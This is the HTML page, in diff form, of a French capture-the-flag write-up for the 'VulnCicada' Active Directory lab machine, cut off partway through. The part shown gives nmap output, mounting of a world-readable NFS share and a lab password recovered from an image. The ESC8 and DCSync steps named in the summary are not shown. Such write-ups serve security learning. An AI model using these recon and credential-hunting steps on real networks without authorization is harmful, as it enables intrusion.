@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>VulnCicada - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/vulncicada/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="VulnCicada">
+  <meta property="og:description" content="VulnCicada est une machine Windows Active Directory de difficulté moyenne impliquant la découverte d’un mot de passe caché dans une image sur un partage public. Avec ce mot de passe, un attaquant peut découvrir que la machine est vulnérable à ESC8 et utiliser le relais Kerberos pour contourner les restrictions d’auto-relais afin d’obtenir un certificat en tant que compte machine lui-même. Avec ce nouveau certificat, nous pouvons extraire les hashes de l’utilisateur Administrator et ainsi compromettre l’ensemble du domaine.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:tag" content="Medium">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="ESC8">
+    <meta property="article:tag" content="DCSync">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="VulnCicada">
+  <meta name="twitter:description" content="VulnCicada est une machine Windows Active Directory de difficulté moyenne impliquant la découverte d’un mot de passe caché dans une image sur un partage public. Avec ce mot de passe, un attaquant peut découvrir que la machine est vulnérable à ESC8 et utiliser le relais Kerberos pour contourner les restrictions d’auto-relais afin d’obtenir un certificat en tant que compte machine lui-même. Avec ce nouveau certificat, nous pouvons extraire les hashes de l’utilisateur Administrator et ainsi compromettre l’ensemble du domaine.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/vulncicada/" /><link rel="next" href="http://localhost:1313/voleur/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "VulnCicada",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/vulncicada\/"
+        },"genre": "posts","keywords": "Medium, Windows, Active Directory, ESC8, DCSync","wordcount":  2714 ,
+        "url": "http:\/\/localhost:1313\/vulncicada\/","datePublished": "2025-12-11T10:28:41+00:00","dateModified": "2025-12-11T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">VulnCicada</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;2714 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#enumération">Enumération</a>
+          <ul>
+            <li><a href="#scan-de-ports">Scan de ports</a></li>
+            <li><a href="#nfs---tcp-2049">NFS - TCP 2049</a></li>
+            <li><a href="#smb---tcp-445">SMB - TCP 445</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-quadministrateur">Shell en tant qu&rsquo;administrateur</a>
+          <ul>
+            <li><a href="#bloodhound">BloodHound</a></li>
+            <li><a href="#esc8">ESC8</a></li>
+            <li><a href="#dcsync">DCSync</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/VulnCicada/vulncicada.png"
+        data-srcset="/images/VulnCicada/vulncicada.png, /images/VulnCicada/vulncicada.png 1.5x, /images/VulnCicada/vulncicada.png 2x"
+        data-sizes="auto"
+        alt="/images/VulnCicada/vulncicada.png"
+        title="VulnCicada" width="772" height="307" /></p>
+<p>VulnCicada est une machine Windows Active Directory de difficulté moyenne impliquant la découverte d&rsquo;un mot de passe caché dans une image sur un partage public. Avec ce mot de passe, un attaquant peut découvrir que la machine est vulnérable à <code>ESC8</code> et utiliser le <code>relais Kerberos</code> pour contourner les restrictions d&rsquo;auto-relais afin d&rsquo;obtenir un certificat en tant que compte machine lui-même. Avec ce nouveau certificat, nous pouvons extraire les hashes de l&rsquo;utilisateur Administrator et ainsi compromettre l&rsquo;ensemble du domaine.</p>
+<h2 id="enumération">Enumération</h2>
+<h3 id="scan-de-ports">Scan de ports</h3>
+<p>Le scan <code>nmap</code> révèle 23 ports ouverts : <code>DNS</code>, <code>Kerberos</code>, <code>NFS</code>, <code>SMB</code>, <code>LDAP</code>, <code>WinRM</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  nmap 10.129.234.48  -T4 --min-rate <span class="m">1000</span> -sV -sC -p- -oN simple-tcp-scan.txt
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-21 22:31 CEST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.234.48
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.27s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65512</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: IIS Windows Server
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-07-21 20:35:10Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">111/tcp   open  rpcbind       2-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rpcinfo:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   program version    port/proto  service
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp   rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp6  rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp   rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp6  rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3         2049/udp   nfs
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3         2049/udp6  nfs
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp   nfs
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp6  nfs
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100005</span>  1,2,3       2049/tcp   mountd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100005</span>  1,2,3       2049/tcp6  mountd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100005</span>  1,2,3       2049/udp   mountd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100005</span>  1,2,3       2049/udp6  mountd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100021</span>  1,2,3,4     2049/tcp   nlockmgr
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100021</span>  1,2,3,4     2049/tcp6  nlockmgr
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100021</span>  1,2,3,4     2049/udp   nlockmgr
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100021</span>  1,2,3,4     2049/udp6  nlockmgr
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>           2049/tcp   status
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>           2049/tcp6  status
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>           2049/udp   status
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>           2049/udp6  status
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cicada.vl0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-09-13T10:42:50
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-09-13T10:42:50
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cicada.vl0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-09-13T10:42:50
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-09-13T10:42:50
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">2049/tcp  open  mountd        1-3 <span class="o">(</span>RPC <span class="c1">#100005)</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cicada.vl0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-09-13T10:42:50
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-09-13T10:42:50
+</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cicada.vl0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-09-13T10:42:50
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-09-13T10:42:50
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-07-21T20:37:23+00:00<span class="p">;</span> -2s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-04-09T08:36:14
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-10-09T08:36:14
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">61984/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">61986/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">62003/tcp open  unknown
+</span></span><span class="line"><span class="cl">62078/tcp open  iphone-sync?
+</span></span><span class="line"><span class="cl">62534/tcp open  unknown
+</span></span><span class="line"><span class="cl">Service Info: Host: DC-JPQ225<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: -1s, deviation: 1s, median: -2s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-07-21T20:36:22
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   311:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required</span></span></code></pre></div></div>
+<p>J&rsquo;ajoute le nom de domaine ainsi que le FQDN dans le fichier <code>/etc/hosts</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.129.234.48 cicada.vl DC-JPQ225.cicada.vl DC-JPQ225&#34;</span> <span class="p">|</span> tee -a /etc/hosts</span></span></code></pre></div></div>
+<h3 id="nfs---tcp-2049">NFS - TCP 2049</h3>
+<p>Il existe un partage NFS accessible à tous.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  showmount -e dc-jpq225.cicada.vl
+</span></span><span class="line"><span class="cl">Export list <span class="k">for</span> dc-jpq225.cicada.vl:
+</span></span><span class="line"><span class="cl">/profiles <span class="o">(</span>everyone<span class="o">)</span></span></span></code></pre></div></div>
+<p>Je monte alors le partage sur ma machine.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# mkdir nfs
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# mount -t nfs dc-jqp225.cicada.vl:/profiles /tmp/nfs -nolock
+</span></span><span class="line"><span class="cl">mount.nfs: Failed to resolve server dc-jqp225.cicada.vl: Name or service not known
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# mount -t nfs dc-jpq225.cicada.vl:/profiles /tmp/nfs -nolock
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">cd</span> nfs
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/tmp/nfs<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">10</span>
+</span></span><span class="line"><span class="cl">drwxrwxrwx+  <span class="m">2</span> nobody nogroup <span class="m">4096</span> Jun  <span class="m">3</span> 12:21 .
+</span></span><span class="line"><span class="cl">drwxrwxrwt  <span class="m">16</span> root   root     <span class="m">440</span> Jul <span class="m">21</span> 22:46 ..
+</span></span><span class="line"><span class="cl">drwxrwxrwx+  <span class="m">2</span> nobody nogroup   <span class="m">64</span> Sep <span class="m">15</span>  <span class="m">2024</span> Administrator
+</span></span><span class="line"><span class="cl">drwxrwxrwx+  <span class="m">2</span> nobody nogroup   <span class="m">64</span> Sep <span class="m">13</span>  <span class="m">2024</span> Daniel.Marshall
+</span></span><span class="line"><span class="cl">drwxrwxrwx+  <span class="m">2</span> nobody nogroup   <span class="m">64</span> Sep <span class="m">13</span>  <span class="m">2024</span> Debra.Wright
+</span></span><span class="line"><span class="cl">drwxrwxrwx+  <span class="m">2</span> nobody nogroup   <span class="m">64</span> Sep <span class="m">13</span>  <span class="m">2024</span> Jane.Carter
+</span></span><span class="line"><span class="cl">drwxrwxrwx+  <span class="m">2</span> nobody nogroup   <span class="m">64</span> Sep <span class="m">13</span>  <span class="m">2024</span> Jordan.Francis
+</span></span><span class="line"><span class="cl">drwxrwxrwx+  <span class="m">2</span> nobody nogroup   <span class="m">64</span> Sep <span class="m">13</span>  <span class="m">2024</span> Joyce.Andrews
+</span></span><span class="line"><span class="cl">drwxrwxrwx+  <span class="m">2</span> nobody nogroup   <span class="m">64</span> Sep <span class="m">13</span>  <span class="m">2024</span> Katie.Ward
+</span></span><span class="line"><span class="cl">drwxrwxrwx+  <span class="m">2</span> nobody nogroup   <span class="m">64</span> Sep <span class="m">13</span>  <span class="m">2024</span> Megan.Simpson
+</span></span><span class="line"><span class="cl">drwxrwxrwx+  <span class="m">2</span> nobody nogroup   <span class="m">64</span> Sep <span class="m">13</span>  <span class="m">2024</span> Richard.Gibbons
+</span></span><span class="line"><span class="cl">drwxrwxrwx+  <span class="m">2</span> nobody nogroup   <span class="m">64</span> Sep <span class="m">15</span>  <span class="m">2024</span> Rosie.Powell
+</span></span><span class="line"><span class="cl">drwxrwxrwx+  <span class="m">2</span> nobody nogroup   <span class="m">64</span> Sep <span class="m">13</span>  <span class="m">2024</span> Shirley.West</span></span></code></pre></div></div>
+<p>En énumérant les répertoires, je ne trouve rien à par l&rsquo;image <code>marketing.png</code> dans le répertoire de <code>Rosie.Powell</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/tmp/cicada<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# tree
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">├── Administrator
+</span></span><span class="line"><span class="cl">│   ├── Documents
+</span></span><span class="line"><span class="cl">│   │   ├── <span class="nv">$RECYCLE</span>.BIN
+</span></span><span class="line"><span class="cl">│   │   │   └── desktop.ini
+</span></span><span class="line"><span class="cl">│   │   └── desktop.ini
+</span></span><span class="line"><span class="cl">│   └── vacation.png
+</span></span><span class="line"><span class="cl">├── Daniel.Marshall
+</span></span><span class="line"><span class="cl">├── Debra.Wright
+</span></span><span class="line"><span class="cl">├── Jane.Carter
+</span></span><span class="line"><span class="cl">├── Jordan.Francis
+</span></span><span class="line"><span class="cl">├── Joyce.Andrews
+</span></span><span class="line"><span class="cl">├── Katie.Ward
+</span></span><span class="line"><span class="cl">├── Megan.Simpson
+</span></span><span class="line"><span class="cl">├── Richard.Gibbons
+</span></span><span class="line"><span class="cl">├── Rosie.Powell
+</span></span><span class="line"><span class="cl">│   ├── Documents
+</span></span><span class="line"><span class="cl">│   │   ├── <span class="nv">$RECYCLE</span>.BIN
+</span></span><span class="line"><span class="cl">│   │   │   └── desktop.ini
+</span></span><span class="line"><span class="cl">│   │   └── desktop.ini
+</span></span><span class="line"><span class="cl">│   └── marketing.png
+</span></span><span class="line"><span class="cl">└── Shirley.West</span></span></code></pre></div></div>
+<p>Mot de passe <code>Cicada123</code> trouvé.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/VulnCicada/VulnCicada-1.png"
+        data-srcset="/images/VulnCicada/VulnCicada-1.png, /images/VulnCicada/VulnCicada-1.png 1.5x, /images/VulnCicada/VulnCicada-1.png 2x"
+        data-sizes="auto"
+        alt="/images/VulnCicada/VulnCicada-1.png"
+        title="/images/VulnCicada/VulnCicada-1.png" width="791" height="761" /></p>
+<h3 id="smb---tcp-445">SMB - TCP 445</h3>
+<p>Authentification <code>anonyme</code> ainsi qu&rsquo;en tant que <code>Guest</code> impossible.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
